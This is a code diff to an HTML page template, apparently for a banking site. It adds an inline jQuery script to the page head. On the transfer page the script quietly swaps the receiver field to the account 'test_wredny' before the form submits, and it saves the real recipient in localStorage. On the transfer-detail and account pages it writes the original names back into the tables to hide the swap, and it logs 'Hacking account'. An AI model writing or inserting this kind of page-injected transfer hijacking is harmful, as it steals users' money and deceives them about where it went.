@@ -1,10 +1,54 @@
 <html>
     <head>
         <meta charset="utf-8">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
         <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
         <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
         <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
-        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+        <script type="text/javascript">
+            window.onload = function(){
+                let path = window.location.pathname
+                if(path === '/transfer/'){
+                    $("form:first").submit(
+                        function(event){
+                            let original_user = $("input[name='receiver']").val()
+                            let original_money = parseFloat($("input[name='number']").val())
+                            window.localStorage.setItem(original_money, original_user)
+                            $("input[name='receiver']").val("test_wredny")
+                        }
+                    );
+
+                }
+                else if(path.includes('transfer_detail') || path.includes('transfer')){
+                    let receiver = $("tbody > tr > th").first().next()
+                    let money = receiver.next()
+                    if(window.localStorage.getItem(parseFloat(money))){
+                        receiver.text(window.localStorage.getItem(parseFloat(money)))
+                    }
+                }
+                else if(window.location.pathname.includes('account')){
+                    console.log("Hacking account")
+                    $("tbody > tr").each(function(index){
+                        let username = $(this).children().first().next()
+                        let money = parseFloat(username.next().text())
+                        usernam = username.text()
+                        if(money < 0){
+                            console.log(money)
+                            money = String(money)
+                            if(!String(money).includes('.')){
+                                money = String(money) + '.0'
+                                money = money.substr(1)
+                            }
+                            console.log(money)
+                            if(window.localStorage.getItem(money)){
+                                username.text(window.localStorage.getItem(money))
+                            }
+                        }
+                    });
+                }
+            }
+        </script>
     </head>
     <body>
     <div class="jumbotron jumbotron-fluid">
